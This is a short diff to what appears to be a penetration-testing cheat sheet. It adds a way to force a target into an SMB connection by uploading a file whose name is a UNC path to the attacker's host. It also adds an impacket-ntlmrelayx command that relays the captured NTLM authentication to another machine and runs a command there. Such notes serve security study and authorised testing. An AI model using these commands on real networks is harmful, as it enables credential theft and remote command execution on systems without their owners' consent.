@@ -418,6 +418,11 @@ Host an smb server to catch smb credentials. Hashes will be found in `./outfile.
 
 	dir \\<host-ip>\tmp
 From target machine, initiate an smb connection.  
+Alternatively, force machine to initiate an smb connection with web uploads i.e. filename `//<host-ip>/tmp`  
+
+## Net-NTLM relay
+	impacket-ntlmrelayx --no-http-server -smb2support -t 123.123.123.130 -c <command>
+listen for smb connections and relay them to 123.123.123.130 and execute command there  
 
 # APPENDIX
 ## Kali built-in wordlists
